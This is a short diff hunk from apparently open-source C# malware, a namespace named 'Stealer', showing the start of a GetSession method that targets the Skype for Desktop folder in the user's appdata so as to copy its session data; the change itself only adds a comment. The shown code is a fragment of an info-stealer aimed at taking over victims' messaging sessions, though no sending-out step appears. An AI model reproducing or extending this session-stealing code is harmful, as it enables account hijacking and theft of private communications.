@@ -6,6 +6,7 @@ namespace Stealer
     {
         private static readonly string SkypePath = Path.Combine(Paths.appdata, "Microsoft\\Skype for Desktop");
 
+        // Copy Local State directory
         public static void GetSession(string sSavePath)
         {
             if (!Directory.Exists(SkypePath))
